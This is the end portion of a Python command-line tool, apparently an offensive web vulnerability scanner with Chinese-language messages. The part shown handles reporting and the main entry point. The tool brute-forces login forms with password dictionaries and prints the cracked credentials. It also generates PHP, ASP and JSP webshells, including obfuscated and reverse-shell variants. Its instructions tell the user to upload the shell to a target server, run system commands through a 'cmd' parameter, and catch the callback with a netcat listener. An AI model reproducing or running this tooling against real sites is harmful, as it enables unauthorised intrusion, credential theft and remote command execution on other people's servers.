        logger.info(f'生成了{shell_type}类型的WebShell，模板: {template_name}')
        return webshell_code

    def _generate_report(self):
        """
        生成扫描结果报告。

        返回:
            dict: 扫描报告
        """
        report = {
            '目标URL': self.target_url,
            '扫描时间': datetime.datetime.now().isoformat(),
            '漏洞信息': self.vulnerabilities,
            '摘要': {
                '总漏洞数': sum(len(vulns) for vulns in self.vulnerabilities.values() if isinstance(vulns, list)),
                '框架': self.vulnerabilities.get('framework', 'Unknown'),
                '扫描URL数': len(self.crawled_urls),
                '破解的凭证数': len(self.cracked_credentials)
            },
            '破解的凭证': self.cracked_credentials
        }

        # Save report to file
        try:
            with open(self.output_file, 'w', encoding='utf-8') as f:
                json.dump(report, f, indent=4, ensure_ascii=False)
            logger.info(f'扫描报告已保存至 {self.output_file}')
        except Exception as e:
            logger.error(f'保存报告时出错: {str(e)}')

        return report


def main():
    # 初始化colorama（在main函数中初始化，确保在打印前执行）
    if has_colorama:
        init(autoreset=True)  # 使用autoreset=True自动重置颜色
    
    # 打印启动信息
    if has_colorama:
        banner = f'''
    =============================================================
    
    {Fore.RED}{Style.BRIGHT} I8,        8        ,8I            88           88b           d88                           {Style.RESET_ALL}
    {Fore.RED}{Style.BRIGHT} `8b       d8b       d8'            88           888b         d888                           {Style.RESET_ALL}
    {Fore.RED}{Style.BRIGHT}  "8,     ,8"8,     ,8"             88           88`8b       d8'88                           {Style.RESET_ALL}
    {Fore.RED}{Style.BRIGHT}   Y8     8P Y8     8P   ,adPPYba,  88,dPPYba,   88 `8b     d8' 88  ,adPPYYba,  8b,dPPYba,   {Style.RESET_ALL}
    {Fore.RED}{Style.BRIGHT}   `8b   d8' `8b   d8'  a8P_____88  88P'    "8a  88  `8b   d8'  88  ""     `Y8  88P'    "8a  {Style.RESET_ALL}
    {Fore.RED}{Style.BRIGHT}    `8a a8'   `8a a8'   8PP""""""   88       d8  88   `8b d8'   88  ,adPPPPP88  88       d8  {Style.RESET_ALL}
    {Fore.RED}{Style.BRIGHT}     `8a8'     `8a8'    "8b,   ,aa  88b,   ,a8"  88    `888'    88  88,    ,88  88b,   ,a8"  {Style.RESET_ALL}
    {Fore.RED}{Style.BRIGHT}      `8'       `8'      `"Ybbd8"'  8Y"Ybbd8"'   88     `8'     88  `"8bbdP"Y8  88`YbbdP"'   {Style.RESET_ALL}
    {Fore.RED}{Style.BRIGHT}                                                                                88           {Style.RESET_ALL} 
    {Fore.RED}{Style.BRIGHT}                                                                                88           {Style.RESET_ALL} 
    
            {Fore.GREEN}{Style.BRIGHT}Wyl-K - Web Vulnerability Scanner{Style.RESET_ALL}        
            {Fore.BLUE}{Style.BRIGHT}Version: 1.0.1{Style.RESET_ALL}                           
    
    =============================================================
    [+] 功能: 检测SQL注入、XSS、文件上传等常见Web漏洞            
    [+] 用法: webmap -u <目标URL>   
    
    =============================================================
    '''
    else:
        banner = r'''
    =============================================================
    
 I8,        8        ,8I            88           88b           d88                            
 `8b       d8b       d8'            88           888b         d888                            
  "8,     ,8"8,     ,8"             88           88`8b       d8'88                            
   Y8     8P Y8     8P   ,adPPYba,  88,dPPYba,   88 `8b     d8' 88  ,adPPYYba,  8b,dPPYba,   
   `8b   d8' `8b   d8'  a8P_____88  88P'    "8a  88  `8b   d8'  88  ""     `Y8  88P'    "8a  
    `8a a8'   `8a a8'   8PP"""""""  88       d8  88   `8b d8'   88  ,adPPPPP88  88       d8  
     `8a8'     `8a8'    "8b,   ,aa  88b,   ,a8"  88    `888'    88  88,    ,88  88b,   ,a8"  
      `8'       `8'      `"Ybbd8"'  8Y"Ybbd8"'   88     `8'     88  `"8bbdP"Y8  88`YbbdP"'   
                                                                                88            
                                                                                88            
    
            Wyl-K - Web Vulnerability Scanner        
            Version: 1.0.1                           
    
    =============================================================
    [+] 功能: 检测SQL注入、XSS、文件上传等常见Web漏洞            
    [+] 用法: webmap -u <目标URL>   
    
    =============================================================
    '''
    print(banner)

    parser = argparse.ArgumentParser(description='Webmap漏洞扫描器 - 一个全面的Web漏洞扫描工具，可以检测SQL注入、XSS、文件上传等常见漏洞，支持自动渗透和登录爆破')
    parser.add_argument('-u', '--url', help='目标URL - 指定要扫描的网站URL，例如: http://example.com')
    parser.add_argument('-t', '--threads', type=int, default=10, help='线程数量 (默认: 10) - 并发扫描使用的线程数，增加线程数可以提高扫描速度，但可能会对目标服务器造成较大压力')
    parser.add_argument('-o', '--output', help='报告输出文件 (默认: scan_report_<timestamp>.json)')
    parser.add_argument('-d', '--depth', type=int, default=3, help='爬取深度 (默认: 3) - 网站爬取的最大深度，深度越大，扫描的页面越多，但耗时也越长')
    parser.add_argument('-T', '--timeout', type=int, default=10, help='请求超时时间 (默认: 10) - HTTP请求的超时时间(秒)，超过此时间将认为请求失败')
    parser.add_argument('-a', '--user-agent', help='自定义用户代理 - 设置HTTP请求的User-Agent头，用于模拟不同的浏览器')
    parser.add_argument('-v', '--verbose', action='store_true', help='启用详细输出 - 显示更详细的扫描过程信息，包括调试信息')
    parser.add_argument('-b', '--brute-force', action='store_true', help='启用暴力破解登录 - 尝试破解网站登录表单')
    parser.add_argument('-U', '--usernames', help='用户名字典文件路径 - 包含用户名列表的文本文件，每行一个用户名，或使用"default"表示使用内置默认字典')
    parser.add_argument('-P', '--passwords', help='密码字典文件路径 - 包含密码列表的文本文件，每行一个密码，或使用"default"表示使用内置默认字典')
    parser.add_argument('-m', '--max-attempts', type=int, default=100, help='最大登录尝试次数 (默认: 100) - 限制暴力破解的尝试次数')
    parser.add_argument('--generate-webshell', action='store_true', help='生成WebShell - 生成不同类型的WebShell代码')
    parser.add_argument('--webshell-type', choices=['php', 'asp', 'jsp'], default='php', help='WebShell类型 (默认: php) - 指定要生成的WebShell类型')
    parser.add_argument('--webshell-template', choices=['simple', 'post', 'base64', 'obfuscated', 'reverse_shell'], default='simple', help='WebShell模板 (默认: simple) - 指定要使用的WebShell模板')
    parser.add_argument('--reverse-ip', help='反向Shell的IP地址 - 当使用reverse_shell模板时需要指定')
    parser.add_argument('--reverse-port', type=int, default=4444, help='反向Shell的端口 (默认: 4444) - 当使用reverse_shell模板时使用')
    parser.add_argument('--output-webshell', help='WebShell输出文件 - 指定生成的WebShell保存的文件路径')
    parser.add_argument('--auto-webshell', help='自动生成WebShell - 指定文件扩展名，程序将自动选择对应的WebShell类型，例如: php, asp, jsp')

    args = parser.parse_args()

    # 检查必要参数
    if not args.generate_webshell and not args.auto_webshell and not args.url:
        print("错误: 必须提供目标URL参数 (-u/--url) 或使用WebShell生成功能")
        print("使用示例:")
        print("  python web_vulnerability_scanner.py -u http://example.com")
        print("  python web_vulnerability_scanner.py --generate-webshell")
        print("使用 -h 或 --help 查看完整帮助信息")
        return

    # If verbose mode is enabled, set logging level to DEBUG
    if args.verbose:
        logger.setLevel(logging.DEBUG)

    # 加载用户提供的字典文件
    username_dict = default_usernames
    if args.usernames and args.usernames.lower() != 'default':
        try:
            with open(args.usernames, 'r', encoding='utf-8') as f:
                username_dict = [line.strip() for line in f if line.strip()]
            logger.info(f'加载了 {len(username_dict)} 个用户名')
        except Exception as e:
            logger.error(f'加载用户名字典文件时出错: {str(e)}')
            logger.info('使用默认用户名字典')
    elif args.usernames and args.usernames.lower() == 'default':
        logger.info('使用默认用户名字典')

    password_dict = default_passwords
    if args.passwords and args.passwords.lower() != 'default':
        try:
            with open(args.passwords, 'r', encoding='utf-8') as f:
                password_dict = [line.strip() for line in f if line.strip()]
            logger.info(f'加载了 {len(password_dict)} 个密码')
        except Exception as e:
            logger.error(f'加载密码字典文件时出错: {str(e)}')
            logger.info('使用默认密码字典')
    elif args.passwords and args.passwords.lower() == 'default':
        logger.info('使用默认密码字典')

    # 处理WebShell生成功能
    if args.generate_webshell:
        print("\n[+] WebShell生成功能")
        print("====================================")
        scanner = WebScanner(target_url='http://example.com')  # 创建一个临时实例
        
        # 自动模式处理
        if args.auto_webshell:
            file_extension = args.auto_webshell.lstrip('.')  # 移除可能的点号
            shell_type = scanner.get_webshell_type_by_extension(file_extension)
            
            if not shell_type:
                print(f"错误: 无法识别的文件扩展名 '{file_extension}'，无法自动确定WebShell类型")
                print("支持的扩展名: php, php5, php7, phtml, inc, asp, aspx, ascx, asmx, jsp, jspx, jws, do")
                print("====================================")
                return
            
            print(f"自动检测到文件扩展名 '{file_extension}' 对应的WebShell类型: {shell_type}")
            # 根据类型选择默认模板
            default_template = 'simple'
            
            # 对于反向shell，需要IP和端口
            if args.webshell_template == 'reverse_shell' and not args.reverse_ip:
                print("错误: 生成反向shell需要提供IP地址 (--reverse-ip)")
                print("====================================")
                return
            
            shell_code = scanner.generate_webshell(
                shell_type=shell_type,
                template_name=args.webshell_template,
                ip=args.reverse_ip,
                port=args.reverse_port
            )
        else:
            # 常规模式
            shell_code = scanner.generate_webshell(
                shell_type=args.webshell_type,
                template_name=args.webshell_template,
                ip=args.reverse_ip,
                port=args.reverse_port
            )
        
        if shell_code:
            # 确定实际的shell类型
            actual_shell_type = shell_type if args.auto_webshell else args.webshell_type
            file_extension = actual_shell_type.lower()
            
            print(f"\n生成的{actual_shell_type} WebShell ({args.webshell_template}):")
            print("------------------------------------")
            print(shell_code)
            print("------------------------------------")
            
            if args.output_webshell:
                try:
                    with open(args.output_webshell, 'w', encoding='utf-8') as f:
                        f.write(shell_code)
                    print(f"\nWebShell已保存至: {args.output_webshell}")
                except Exception as e:
                    print(f"保存WebShell时出错: {str(e)}")
            
            # 提供使用说明
            if args.webshell_template == 'simple':
                print("\n使用方法:")
                print(f"1. 将此代码保存为.{file_extension}文件并上传到目标服务器")
                print(f"2. 通过访问 http://target/path/shell.{file_extension}?cmd=命令 执行系统命令")
            elif args.webshell_template == 'post':
                print("\n使用方法:")
                print(f"1. 将此代码保存为.{file_extension}文件并上传到目标服务器")
                print(f"2. 使用POST方法发送cmd参数执行系统命令")
            elif args.webshell_template == 'reverse_shell':
                print("\n使用方法:")
                print(f"1. 在你的机器上监听端口: nc -lvnp {args.reverse_port}")
                print(f"2. 将此代码保存为.{file_extension}文件并上传到目标服务器")
                print(f"3. 访问该文件触发反向连接")
        
        print("====================================")
        return

    # 正常扫描功能
    scanner = WebScanner(
        target_url=args.url,
        threads=args.threads,
        timeout=args.timeout,
        user_agent=args.user_agent,
        output_file=args.output,
        brute_force=args.brute_force,
        username_dict=username_dict,
        password_dict=password_dict,
        max_login_attempts=args.max_attempts
    )
    scanner.max_depth = args.depth

    try:
        report = scanner.run_full_scan()

        # 检查报告是否有效
        if isinstance(report, dict):
            # 如果是中断状态，从report中获取报告或直接使用漏洞信息生成报告
            if report.get('status') == 'interrupted':
                print("\n=== 扫描被中断，但已保存部分结果 ===")
                # 使用已有的漏洞信息生成报告
                if 'report' in report:
                    final_report = report['report']
                else:
                    final_report = {
                        '目标URL': scanner.target_url,
                        '扫描时间': datetime.datetime.now().isoformat(),
                        '漏洞信息': report['vulnerabilities'],
                        '摘要': {
                            '总漏洞数': sum(len(vulns) for vulns in report['vulnerabilities'].values() if isinstance(vulns, list)),
                            '框架': report['vulnerabilities'].get('framework', 'Unknown'),
                            '扫描URL数': len(scanner.crawled_urls)
                        }
                    }
            else:
                final_report = report

            # Print summary
            print("\n=== 扫描摘要 ===")
            print(f"目标URL: {final_report['目标URL']}")
            print(f"扫描时间: {final_report['扫描时间']}")
            print(f"识别的框架: {final_report['摘要']['框架']}")
            print(f"发现的管理页面: {len(final_report['漏洞信息'].get('admin_pages', []))}")
            print(f"发现的登录表单: {len(scanner.login_forms)}")
            print(f"破解的凭证数: {final_report['摘要']['破解的凭证数']}")
            print(f"已爬取URL数: {len(scanner.crawled_urls)}")
            print(f"总漏洞数: {final_report['摘要']['总漏洞数']}")
            print(f"报告文件: {scanner.output_file}")

            # 打印破解的凭证信息
            if final_report['破解的凭证']:
                print("\n=== 破解的凭证 ===")
                for i, cred in enumerate(final_report['破解的凭证'], 1):
                    print(f"{i}. URL: {cred['url']}")
                    print(f"   用户名: {cred['username']}")
                    print(f"   密码: {cred['password']}")
                    print()
            print("==================\n")

            # Print vulnerability details
            if final_report['漏洞信息']:
                print("=== 漏洞详情 ===")
                vuln_count = 1
            for vuln_type, vulns in final_report['漏洞信息'].items():
                if isinstance(vulns, list) and vulns:
                    for vuln in vulns:
                        print(f"{vuln_count}. {vuln_type}")
                        if 'url' in vuln:
                            print(f"   URL: {vuln['url']}")
                        if 'param' in vuln:
                            print(f"   参数: {vuln['param']}")
                        if 'cve' in vuln:
                            print(f"   CVE: {vuln['cve']}")
                        if 'description' in vuln:
                            print(f"   描述: {vuln['description']}")
                        if 'credentials' in vuln:
                            print(f"   使用凭证: {vuln['credentials']['username']}/{vuln['credentials']['password']}")
                        print()
                        vuln_count += 1
    except KeyboardInterrupt:
        logger.info('扫描被用户中断')
    except Exception as e:
        logger.error(f'扫描过程中出错: {str(e)}')


if __name__ == "__main__":
    main()